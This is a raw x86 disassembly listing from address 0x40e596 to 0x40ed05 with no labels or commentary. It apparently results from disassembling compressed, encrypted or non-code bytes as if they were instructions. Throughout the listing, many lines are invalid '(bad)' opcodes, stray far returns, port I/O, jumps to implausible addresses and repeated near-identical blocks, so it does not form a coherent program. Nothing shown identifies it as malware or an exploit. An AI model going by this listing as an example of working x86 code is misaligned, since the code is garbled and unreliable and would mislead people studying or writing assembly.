  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
